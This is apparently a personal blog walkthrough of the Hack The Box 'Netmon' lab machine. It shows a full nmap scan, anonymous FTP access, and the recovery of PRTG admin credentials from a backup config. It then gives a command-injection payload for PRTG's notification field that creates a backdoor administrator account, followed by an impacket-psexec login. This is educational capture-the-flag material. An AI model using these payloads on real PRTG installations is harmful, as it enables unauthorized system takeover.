+++
author = "Jake Rice"
title = "Who's That Netmon?!?!"
date = "2022-08-29"
description = ""
draft = true
tags = [
    "HTB",
    "CTF_Walkthrough",
]

featureImage = "https://raw.githubusercontent.com/JRHacka/Blog-Site/main/jrhacka/static/images/Netmon.png" #Can't get image to work
thumbnail = "https://raw.githubusercontent.com/JRHacka/Blog-Site/main/jrhacka/static/images/CoCanDaLogo.png"
shareImage = "https://raw.githubusercontent.com/JRHacka/Blog-Site/main/jrhacka/static/images/CoCanDaLogo.png"

+++
Yes that title was a Pokemon reference, and if you didn't understand it I feel sorry for you. This is my walkthrough of the HTB Netmon box. Enjoy, and find my walkthough below!

<!--more-->
---
## Startup

This is an entry level beginner friendly box, so the walkthrough is going to be the same. With that being said, the first step that other walkthroughs always skip over is spinning up the box and getting connected. While it is easy once you know how to do it if you don't know how you'll never be able to get started. Feel free to skip to the next section if you already know how to do this.

HTB has 2 options when it comes to completing their boxes. You can spin up a machine via HTB, or connect your own using OpenVPN. I prefer to connect my because of the customizations and different tools I have on my Kali machine, but if you want here is where to find the HTB Attack Box.

The first step if you are connecting via OpenVPN is to first make sure you have OpenVPN installed on your device. Either start typing the command see if it autofill’s, or if using Kali run:
```bash
sudo apt install openvpn
```
Once you are sure is installed in the same place where you see the attack box you can select OpenVPN. Change the server if desired and then download the file. Find the file location and run the following command:
```bash
openvpn insert/filepath/here
```

After you have connected you may have to refresh the page in order for the connect box to turn green and show your HTB IP. After that the last step is to find the Jerry box and start it up.
{{% notice note "Heads Up"%}}
That IP in the green box will be the IP you use for yourself during interactions with this box. Do not use your actual IP.
{{% /notice %}}

---

## Intelligence Gathering

The first thing I always like to do is run NMap. Here is the NMap scan I ran and a breakdown of the flags I used.
{{% notice tip "NMAP Flags"%}}
-sT = TCP Connect() Scan

-sV = OS Version

-Pn = Scan all ports, and don't ping. (Scans ports no matter what)

-p- = All ports

-A = All

-T3 = Speed level. (Options 1-5 with 1 being slowest and 5 fastest)

-oA = output namp in the three formats to the specified file path.
{{% /notice %}}
```bash
nmap -sT -sV -Pn -p- -A -T3 tar.get.ip.add -oA /home/kali/HTB/Recording/Netmon/Nmap/nmap
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-29 19:42 EDT
Nmap scan report for 10.10.10.152
Host is up (0.038s latency).
Not shown: 65522 closed tcp ports (conn-refused)
PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM       <DIR>          inetpub
| 07-16-16  09:18AM       <DIR>          PerfLogs
| 02-25-19  10:56PM       <DIR>          Program Files
| 02-03-19  12:28AM       <DIR>          Program Files (x86)
| 02-03-19  08:08AM       <DIR>          Users
|_02-25-19  11:49PM       <DIR>          Windows
80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-server-header: PRTG/18.1.37.13946
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=8/29%OT=21%CT=1%CU=38952%PV=Y%DS=2%DC=T%G=Y%TM=630D4F6
OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=109%TI=I%CI=I%II=I%SS=S%TS=
OS:A)OPS(O1=M539NW8ST11%O2=M539NW8ST11%O3=M539NW8NNT11%O4=M539NW8ST11%O5=M5
OS:39NW8ST11%O6=M539ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=200
OS:0)ECN(R=Y%DF=Y%T=80%W=2000%O=M539NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S
OS:+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%
OS:T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=
OS:0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%
OS:S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
OS:R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
OS:N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-08-29T23:44:30
|_  start_date: 2022-08-29T23:40:15
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

TRACEROUTE (using proto 1/icmp)
HOP RTT      ADDRESS
1   36.15 ms 10.10.14.1
2   36.21 ms 10.10.10.152

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 110.68 seconds
```

So, we've got one item that really catches my eye in that NMap scan. Our old friend port 21 Anonymous FTP is open, and seems like an excellent place to start. 

---
## Port 21 - Anonymous FTP

In the NMap scan the first thing that should catch your eye is that port 21 FTP is allowing Anonymous FTP. Anonymous FTP essentially means we can log in wihout having a username or password. We will connect using the user name anonymous with no password.
```bash
ftp anonymous@tar.get.ip.add 
```
{{% notice note "Heads Up"%}}
The username being used is the one before the @ sign.
{{% /notice %}}

Once in we can begin doing our usual snooping, and unlike the Lame box here we can find a lot of useful stuff. In fact we can find our first flag in the users.txt file. Now we can't find the root flag, but we can find the items that are going to eventually lead us to the root flag. For now it is time we move out of our anonymous ftp and begin exploring the site itself. 

---
## Accessing the Site

Before we can begin exploring the site we need to successfully login. First thing to always do is check default credintials. After doing some quick Googling you find the username and password. Unforutanetly prtgadmin does not work, so on to plan B. There's some tools and ways we could bruteforce this perhaps, but this PRTGNetworkMonitor appears to be a pretty popular software. Being the creative hackers we are lets see if we can see the configuration files via the anonymous ftp. According to https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data we can find the configuration files stored as PRTG Configuration.dat and that seems like a good a place to start as any.

Jumping back into anonymous ftp we are gonna head to the directory specified from that site. The directroy these files are stored in is Program Data, and at first it doesn't appear because it is hidden. Running the show directory command with a -a will now reveal program data. Navigating through there the config.old/.old.bak/.dat should catch your attention. When you open that up you see in the .old.bak file an admin username and password. 


BUTTTTT it still didn't work. After banging my head on the wall I realized it was a .old document, and it had a year in it. I changed the year to 2019 and was in. Cash money it's time to explore this site.

---
## Exploring the Site

This website has a whole lot going on. More then I care to just snoop into, so let's see if there are any known exploits. Looking up this version of the PRTG Network Monitor I started to get a lot of great information. We get some results about a Metasploit exploit, and also some articles about using the notifications to send malicious commands. For the sake of getting better everyday let's see if we can figure out these notifications and execute something from there. 

---
## Exploiting the Vulnerability (Command Injection)

Another incredible site https://tryhackme.com defines command injection as "the abuse of an application's behaviour to execute commands on the operating system, using the same privileges that the application on a device is running with." The notification portion of this site allows you to do some pretty interesting things, and that is going to be our home as we finish gaining administrator access to this box. 

In the bar up top select Settings, Account settings, Notifications, and then plus sign to create a new notification. Creating the notification we'll just skip most of the stuff at the top and jump straight to the bottom. There we find an option to execute program, and when you turn it on you can type a powershell command. We are going to create an admin user via this command to login using impacket-exec.
```bash
abc123.txt | net user jrhacka passwd123! /add ; net localgroup administrators jrhacka /add
```
{{% notice tip "Breaking Down the Command"%}}
abc123.txt = Random document attempting to open

| = and do what is after this also

net user jrhacka passwd123! /add = creating the user jrhacka with the password passwd123!

; = seperating the commands

net localgroup administrators jrhacka /add = adding jrhacka to the administrators group
{{% /notice %}}

---
## Using Impacket PsExec

First off what is PsExec? According to https://www.lifewire.com/psexec-4587631 "PsExec is a portable tool from Microsoft that lets you run processes remotely using any user's credentials. It’s a bit like a remote access program but instead of controlling the computer with a mouse, commands are sent via Command Prompt." That's explained it very well, and we are going to use the kali tool impacket-psexec in order to connect to this machine with the credintials we just created. Here is the syntax when connecting with this tool.
```bash
impacket-psexec jrhacka:'passwd123!'@10.10.10.152
```
After you've connected it's just a matter of snooping around and navigating back to that administrator directory we couldn't get to earlier. In there we find the admin flag and that's all she wrote! I hope you all learned something, enjoyed my writeup, and keep on getting better every day! 

---

